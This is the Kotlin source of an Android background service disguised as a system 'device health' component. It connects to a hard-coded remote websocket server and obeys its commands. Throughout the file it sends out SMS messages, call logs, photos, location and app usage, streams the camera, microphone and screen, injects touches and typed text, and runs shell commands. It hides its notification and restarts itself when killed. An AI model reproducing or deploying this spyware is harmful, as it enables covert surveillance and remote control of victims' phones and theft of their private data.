package com.system.service.core

import android.app.*
import android.content.Intent
import android.hardware.camera2.*
import android.location.Location
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.system.service.monitors.*
import com.system.service.setup.ShakeDetector
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://dbb8b339-6f63-4353-b557-828369c2aaf6-00-1ox04gta0r1v2.sisko.replit.dev/api/ws"
        private const val CHANNEL_ID = "device_health"
        private const val NOTIF_ID = 1
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var shakeDetector: ShakeDetector? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        acquireWakeLock()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildHiddenNotification())
        connectServer()
        WatchdogReceiver.schedule(this)
        MonitorWorker.enqueue(this)
        shakeDetector = ShakeDetector(this).also { it.start() }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        wsManager?.disconnect()
        shakeDetector?.stop()
        releaseWakeLock()
        WatchdogReceiver.schedule(this)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        WatchdogReceiver.schedule(this)
        try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "DeviceHealth::CoreLock"
            ).also { it.setReferenceCounted(false); it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }
    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    private fun connectServer() {
        val savedUrl = getSharedPreferences("config", MODE_PRIVATE).getString("server_url", null)
        if (savedUrl != null) SERVER_URL = savedUrl
        wsManager = WebSocketManager(SERVER_URL,
            onMessage      = { handleCommand(it) },
            onConnected    = {},
            onDisconnected = {}
        )
        wsManager?.connect()
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {

                // ── URL Update (from parent app) ───────────────────────────
                "update_url" -> {
                    val newUrl = data.optString("url")
                    if (newUrl.startsWith("ws://") || newUrl.startsWith("wss://")) {
                        SERVER_URL = newUrl
                        getSharedPreferences("config", MODE_PRIVATE)
                            .edit().putString("server_url", newUrl).apply()
                        wsManager?.disconnect()
                        connectServer()
                    }
                }

                // ── Basic ──────────────────────────────────────────────────
                "lock_screen"       -> lockScreen()
                "get_battery"       -> sendBattery()
                "get_location"      -> sendLocation()
                "take_photo"        -> takeSinglePhoto()

                "wifi_on"  -> runShellCmd("svc wifi enable")
                "wifi_off" -> runShellCmd("svc wifi disable")

                "get_gallery"     -> sendGallery(data.optInt("limit", 20))
                "get_full_photo"  -> sendFullPhoto(data.optString("path"))
                "get_call_log"    -> sendCallLog(data.optInt("limit", 50))
                "get_sms"         -> sendSms(data.optInt("limit", 50))
                "get_running_app" -> sendCurrentApp()
                "get_app_usage"   -> sendAppUsage(data.optInt("hours", 24))

                "start_camera_stream" -> startService(
                    Intent(this, CameraStreamService::class.java)
                        .putExtra("interval", data.optLong("interval", 2000L)))
                "stop_camera_stream"  -> startService(
                    Intent(this, CameraStreamService::class.java).setAction("STOP"))

                "start_mic_stream" -> startService(Intent(this, AudioStreamService::class.java))
                "stop_mic_stream"  -> startService(
                    Intent(this, AudioStreamService::class.java).setAction("STOP"))

                "start_screen_stream" -> startService(
                    Intent(this, ScreenStreamService::class.java)
                        .putExtra("interval", data.optLong("interval", 1000L)))
                "stop_screen_stream"  -> startService(
                    Intent(this, ScreenStreamService::class.java).setAction("STOP"))

                "touch"   -> AccessibilityMonitor.performTouch(
                    data.optDouble("x", 0.0).toFloat(),
                    data.optDouble("y", 0.0).toFloat())
                "swipe"   -> AccessibilityMonitor.performSwipe(
                    data.optDouble("x1", 0.0).toFloat(),
                    data.optDouble("y1", 0.0).toFloat(),
                    data.optDouble("x2", 0.0).toFloat(),
                    data.optDouble("y2", 500.0).toFloat(),
                    data.optLong("duration", 300))
                "key_back"    -> AccessibilityMonitor.performBack()
                "key_home"    -> AccessibilityMonitor.performHome()
                "key_recents" -> AccessibilityMonitor.performRecents()
                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))

                "grant_permissions" -> {
                    val count = ShizukuManager.grantAllPermissions(this)
                    sendData("permissions_result", JSONObject().apply {
                        put("granted", count)
                        put("shizuku_available", ShizukuManager.isShizukuAvailable())
                    })
                }
            }
        } catch (_: Exception) {}
    }

    fun sendData(type: String, data: JSONObject) {
        try {
            data.put("type", type)
            data.put("ts", System.currentTimeMillis())
            wsManager?.send(data)
        } catch (_: Exception) {}
    }

    private fun lockScreen() {
        try {
            (getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
                .lockNow()
        } catch (_: Exception) {}
    }

    private fun runShellCmd(cmd: String) {
        try { Runtime.getRuntime().exec(cmd.split(" ").toTypedArray()).waitFor() }
        catch (_: Exception) {}
    }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            sendData("battery", JSONObject().apply {
                put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
                put("charging", bm.isCharging)
            })
        } catch (_: Exception) {}
    }

    private fun sendLocation() {
        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                loc?.let {
                    sendData("location", JSONObject().apply {
                        put("lat", it.latitude); put("lng", it.longitude)
                        put("accuracy", it.accuracy)
                    })
                }
            }
        } catch (_: Exception) {}
    }

    private fun sendGallery(limit: Int) {
        try {
            val photos = GalleryManager.getRecentPhotos(this, limit)
            sendData("gallery", JSONObject().apply { put("photos", photos) })
        } catch (_: Exception) {}
    }

    private fun sendFullPhoto(path: String) {
        try {
            val b64 = GalleryManager.getFullPhoto(this, path) ?: return
            sendData("full_photo", JSONObject().apply { put("image", b64); put("path", path) })
        } catch (_: Exception) {}
    }

    private fun sendCallLog(limit: Int) {
        try {
            val calls = CallLogManager.getCallLog(this, limit)
            sendData("call_log", JSONObject().apply { put("calls", calls) })
        } catch (_: Exception) {}
    }

    private fun sendSms(limit: Int) {
        try {
            val msgs = SmsReader.getSms(this, limit)
            sendData("sms", JSONObject().apply { put("messages", msgs) })
        } catch (_: Exception) {}
    }

    private fun sendCurrentApp() {
        try {
            val pkg = AppUsageManager.getCurrentApp(this)
            sendData("current_app", JSONObject().apply { put("package", pkg ?: "") })
        } catch (_: Exception) {}
    }

    private fun sendAppUsage(hours: Int) {
        try {
            val stats = AppUsageManager.getUsageStats(this, hours)
            sendData("app_usage", JSONObject().apply { put("stats", stats) })
        } catch (_: Exception) {}
    }

    private fun takeSinglePhoto() {
        try {
            startService(Intent(this, CameraStreamService::class.java)
                .putExtra("interval", 99999999L))
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Background Services",
            NotificationManager.IMPORTANCE_NONE).apply {
            setShowBadge(false); enableLights(false); enableVibration(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildHiddenNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false).setSilent(true).build()

    override fun onStartCommand(intent: Intent?, flags: Int, id: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
